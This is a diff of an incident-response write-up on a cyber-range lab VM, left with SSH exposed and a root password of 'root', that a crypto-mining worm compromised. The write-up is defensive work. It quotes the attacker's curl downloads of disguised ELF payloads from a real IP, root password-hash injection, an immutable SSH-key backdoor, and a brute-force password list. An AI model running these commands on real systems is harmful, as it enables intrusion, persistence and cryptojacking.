@@ -157,14 +157,16 @@ Log Analytics: stores & exposes it
 
 At the time of compromise, the VM was actively being used for a **student lab exercise** designed to trigger insecure authentication practices for Tenable scans.
 
+<br>
+
+<img width="764" height="212" alt="image" src="https://github.com/user-attachments/assets/88779564-9ad3-4531-9fcd-cd627f7525d0" />
+
+<br>
+
 Lab configuration included:
 - SSH access intentionally exposed  
 - **Root password set to `root`**  
 - Expected vulnerability generation in Tenable for followup remediation
-
-**Students are instructed to destroy VM asap when lab is finished** <Br>
-
-<img width="764" height="212" alt="image" src="https://github.com/user-attachments/assets/88779564-9ad3-4531-9fcd-cd627f7525d0" />
 
 <br>
 
@@ -173,8 +175,8 @@ Lab configuration included:
 ### Student changes Root password | AHTKzAEv
 
 - Student begins the lab, changing root password to _root_
-   - `2026-01-30T13:50:32.826013Z` — `/etc/shadow` edited by _Labuser_ via root (student password change)
-   - `2026-01-30T14:02:04.257228Z` ~12 minutes later, first suspicious file `/var/tmp/AHTKzAEv` is created
+   - _2026-01-30T`13:50`:32.826013Z_ — `/etc/shadow` edited by _Labuser_ via root (student password change)
+   - _2026-01-30T`14:02`:04.257228Z_ ~12 minutes later, first suspicious file `/var/tmp/AHTKzAEv` is created
    - `AHTKzAEv` and its siblings appear in `/var/tmp` or `/usr/bin` with gibberish names, running as root processes
 
 ```kql
@@ -187,20 +189,19 @@ DeviceFileEvents
 
 <br>
 
-<img width="1103" height="283" alt="image" src="https://github.com/user-attachments/assets/6ac566a0-a285-4a43-b403-a1ee36c917fc" />
+<img width="1103" height="283" alt="image" src="https://github.com/user-attachments/assets/6ac566a0-a285-4a43-b403-a1ee36c917fc" /> <br>
 
 <Br>
 
-**File lifecycle after creation** 
+| Timestamp       | File / Action                         | Notes                                                                                      |
+|-----------------|--------------------------------------|--------------------------------------------------------------------------------------------|
+| 2:02:04         | `AHTKzAEv` and multiple `x.sh` files | Initial payload and helper scripts                                                         |
+| 2:02:04.957     | `retea` in `/dev/shm`                 | `/dev/shm` is shared memory; malware sometimes drops helpers here for fast execution or stealth (RAM-only execution) |
+| 2:02:05         | `/root/.ssh/authorized_keys` updated | Allows persistence via SSH (attacker can log in without a password)                        |
+| 2:02:05         | `/etc/passwd` and `/etc/shadow` updated | Confirms attacker escalated privileges / added backdoors |
 
-- 2:02:04 — `AHTKzAEv` and multiple `x.sh` files created
-   -  initial payload and helper scripts
-- 2:02:04.957 — `retea` in `/dev/shm` created
-   - `/dev/shm` is shared memory. malware sometimes drops helpers here for fast execution or stealth (RAM-only execution)
-- 2:02:05 — `/root/.ssh/authorized_keys` updated
-  - Allows persistence via SSH (attacker can log in without a password)
-- 2:02:05 — `/etc/passwd` and `/etc/shadow` updated
-   - Confirms the attacker escalated privileges / added backdoors, possibly adding a new root password
+<br>
+
 - Repeated FileCreated / FileDeleted events for `x.sh` and `AHTKzAEv`
    - This pattern suggests execution loops: run the script → collect data → delete temporary files → drop new scripts to continue
    - Deleting files is often to avoid forensic detection
@@ -220,14 +221,10 @@ DeviceFileEvents
 
 ### Malware Injects Password Hash for Root
 
-- **Command:** usermod -p ********** root
+- **Command:** _usermod -p ********** root_
    - `usermod` → Linux command used to modify a user account
    - `-p **********` → Sets the user’s password hash directly (not plaintext)
    - `root` → The username being modified
-
-- ********** is the masked hash, so you don’t see it
-- By replacing or adding a root hash with its own, malware creates a backdoor
-- Student is still able to log in/won't get booted off
   
  <Br>
 
@@ -235,11 +232,16 @@ DeviceFileEvents
 
 <br>
 
-- This takes place just 12 minutes after student's password change
+- `**********` is the masked hash, so you don’t see it
+- By replacing or adding a root hash with its own, malware creates a backdoor
+- Student is still able to log in/continue session
+- Student won't get booted off or have any indication compromise has happened
+- This takes place just **12 minutes** after student's root password change
 - Student wouldn't have had ample time to complete lab before device is compromised
 
  <br>
 
+**Students are instructed to destroy VM asap when lab is finished** to avoid compromise
 <img width="788" height="386" alt="image" src="https://github.com/user-attachments/assets/7adfaba9-8836-42cf-a495-8014fff03e91" />
 
 <br>
@@ -316,13 +318,13 @@ rm -rf .bash_history ~/.bash_history
 ---
 ## SSH Brute Force on Internal Subnet (10.1.0.0/24)
 
-**Malware is scanning internal subnet `10.1.0.0/24`**
-   - IP addresses in the range of _(10.1.0.0–10.1.0.255)_ were probed
+**Malware scans internal subnet `10.1.0.0/24`**
+   - Malware probes IP addresses in the range of _(10.1.0.0–10.1.0.255)_
    - _Port 22 SSH_ → looking for servers that accept SSH connections
    -  If SSH is open, the malware tries common passwords for user accounts <br>
    <br>
    
-**Password exerpt from retea script**
+**Password exerpt from _retea_ script**
 
 ```
 root root
@@ -332,9 +334,6 @@ root root123456
 root 123456
 root 123
 ```
-
-   - Each attempt generates a _ConnectionRequest_ log, whether it succeeds or fails
-   - No _ConnectionSuccess_ was observed
 
  <br>
 
@@ -352,6 +351,9 @@ root 123
 <img width="1096" height="307" alt="image" src="https://github.com/user-attachments/assets/6efd8585-e0dc-4120-967f-cf6c4eb6779b" />
 
 <Br>
+
+- Each attempt generates a _ConnectionRequest_ log, whether it succeeds or fails
+- No _ConnectionSuccess_ was observed
 
 **If it successfully logs in, it can restart the whole process:**
    - Install itself on the new host
@@ -388,11 +390,11 @@ root 123
      <br>
      
 ### .b4nd1d0 
-- a _leetspeak_ spelling of "Bandito"
+- a _leetspeak_ spelling of "Bandido" or "Bandit"
 - Known Malware Associations
-   - .b4nd1d0 has been observed in real Linux malware families in the wild
+   - _.b4nd1d0_ has been observed in real Linux malware families in the wild
    - It’s typically a secondary payload, backdoor, or helper binary
-   - Its consistent naming makes it easier for the malware’s cron/systemd scripts to find and execute it repeatedly
+   - Its consistent naming makes it easier for the malware’s cron scripts to find and execute it repeatedly
 
  <br>
  
@@ -400,11 +402,12 @@ root 123
 
 <br>
 
-### Malicious Binary Download p.txt
+### Malicious Binary Download p.txt & r.txt
 
-- curl http://**IP ADDRESS**/p.txt -o ygljglkjgfg0
-   - `p.txt` malicious ELF binary
+- `curl http://23DOT160DOT56DOT194/p.txt -o ygljglkjgfg0`
+   - `p.txt` malicious **ELF binary** (named as _.txt_)
    - `ygljglkjgfg0` renamed executable copy
+- also observed: `curl http://23.160.56.194/r.txt -o sdf3fslsdf15`
  
     <br>
    
@@ -425,8 +428,7 @@ root 123
   <br>
   
 - `ygljglkjgfg0` is the original parent file to spawn the many randomized file names from the start
-  - EX. `tdrbhhtkky`, `omicykvmml`
-- obfuscated file names:
+- obfuscated file names (_`tdrbhhtkky`_, _`omicykvmml`_):
   - Avoid hash-based detections
   - Avoids filename-based detections
   - Makes IOC-based hunting harder
@@ -448,19 +450,20 @@ root 123
    - malware will now run every 3 minutes
 
    <br>
+
+   <img width="608" height="366" alt="image" src="https://github.com/user-attachments/assets/69f4d00b-3769-4bf3-9c9d-f52963e6c1ab" />
+
+   <br>
    
 ---
 
-<br>
-
-### p.txt SHA256 Hashes
-<br>
+### p.txt Variants
 
 - p.txt observations:
    - downloaded on two different devices
    - from same IP `23.160.56.194`
    - to the same file name `ygljglkjgfg`
-   - on 1/27/2026 and 2/2/2026
+   - on _1/27/2026_ and _2/2/2026_
    - both with the same file size `548616`
    - but with two different SHA256
  
@@ -470,10 +473,10 @@ root 123
 
 <br>
   
-- Keep the same URL so all infected machines keep pulling the “latest version”
+- Malware keep the same URL so all infected machines keep pulling the “latest version”
 - FileType: Elf (Executable and Linkable Format) even though it's named .txt
    - Not actually a text file, but a compiled Linux binary
-   - Name file .txt to avoid suspicion
+   - Name file _.txt_ to avoid suspicion
    - Download → Rename → Execute 
 
  **VirusTotal page for both SHA256 Hashes**    
@@ -483,7 +486,7 @@ root 123
 
  <br>
  
-- **Observed behaviors from VirusTotal:**  
+- **Notes from VirusTotal:**  
   - Cryptocurrency mining  
   - Process termination of competing miners  
   - Persistence installation  
@@ -491,19 +494,18 @@ root 123
 
 <br>
 
-
-
-
 ---
 
 ### Binary Relocation and Renaming
 
-The attacker deliberately renamed trusted system binaries:
+**The attacker deliberately renamed trusted system binaries:**
 
-`mv /usr/bin/wget /usr/bin/good` <br>
-`mv /bin/wget /bin/good`  
+```
+mv /usr/bin/wget /usr/bin/good 
+mv /bin/wget /bin/good
+```  
 
-Renaming trusted utilities allows continued payload delivery while bypassing simplistic detections that rely on binary names.
+- Allows continued payload delivery while bypassing detections
 
 <Br>
 
@@ -601,7 +603,7 @@ exit $?                                         # Exit script returning last com
 ### Persistence via /etc/init.d
 
 **`ygljglkjgfg0` is created/copied to _/etc/init.d/_** <br>
-- `/etc/init.d/` is used for startup services Linux systems
+- `/etc/init.d/` is used for startup services on Linux systems
    - That means it would run automatically at boot
 - This confirms **intentional long-term persistence**. 
 
@@ -637,17 +639,18 @@ chattr +ai ~/.ssh/authorized_keys
 
 <br>
 
-- Setting the immutable attribute (`+i`) prevents easy removal and ensures continued access even if credentials are rotated
+_01/30_, day of compromise, actor set root password hash <br>
+_02/02_, actor adds their SSH public key to root's authorized_keys and makes the file immutable
+
+**Why do both?**
+   - Password-based backdoors can be changed or removed by system updates, resets, or admins
+   - Ensures they can always log in via key, even if root password is changed later
+   - SSH key login may not generate password login attempts
+   - `chattr +ai` prevents even root from editing/deleting the key without first removing the immutable attribute
+   - Makes cleanup harder for defenders
 
 <br>
 
-<img width="1152" height="343" alt="image" src="https://github.com/user-attachments/assets/27c03eb7-950e-42d1-81a9-6bdbaea4f2ab" />
-
-<br>
-
-The threat actor established persistent passwordless SSH access by overwriting authorized_keys and setting immutable attributes to prevent removal.
-
-<br>
 <img width="1670" height="1059" alt="image" src="https://github.com/user-attachments/assets/d1937763-4c15-40fd-b980-c44666213c08" />
 
 **Full command with annotations**
@@ -701,7 +704,7 @@ echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A" # Hex for "auth_ok" (signal success t
 
 ---
 
-### retea Crypto Mining Worm
+### Crypto Mining Worm retea
 
 **Script reads in part:**
 
@@ -712,6 +715,14 @@ else
     echo Logged with successfully.
     rm -rf .retea
 ```
+
+**Malware registration check**
+- If the key matches → do nothing
+- If the key does NOT match → print _'login successful'_ and delete `.retea` 
+
+<br>
+
+<img width="1152" height="343" alt="image" src="https://github.com/user-attachments/assets/27c03eb7-950e-42d1-81a9-6bdbaea4f2ab" />
 
 <br>
 
@@ -878,20 +889,22 @@ Miner
 **Cyber Range SOC was previously targeted by this malware**
 
 - Email recieved: **Notice of Microsoft Azure Subscription Termination** from the **Microsoft Azure Safeguard Team**
-- Case SIR21183209
+- Case _SIR21183209_
 - even though malware was not deployed by us, it still originates from our environment and is therefore our responsibility
-- Microsoft temporarily disabled Cyber Range VNet 2
-- Cyber Range Engineer closed off outgoing SSH ports, which may be why subsequent SSH probing has no successful connections
+- Microsoft temporarily **disabled Cyber Range VNet 2**
+- Cyber Range Engineer responds by closing off SSH ports
 
  <br>
 
 <img width="1772" height="1057" alt="image" src="https://github.com/user-attachments/assets/0b716d64-9008-4f0e-b1ab-8562b253104d" />
 
  <br>
+ <Br>
 
-<img width="812" height="547" alt="image" src="https://github.com/user-attachments/assets/a875cdce-1bfc-47e1-8232-0cce169404be" />
+<img width="1919" height="980" alt="image" src="https://github.com/user-attachments/assets/38c3fc55-6b59-47c4-b750-b32886a0d29a" />
 
  <br>
+ <Br>
 
 <img width="1957" height="1055" alt="image" src="https://github.com/user-attachments/assets/4c4f3dff-2186-42ee-8672-adaf360bdfff" />
 
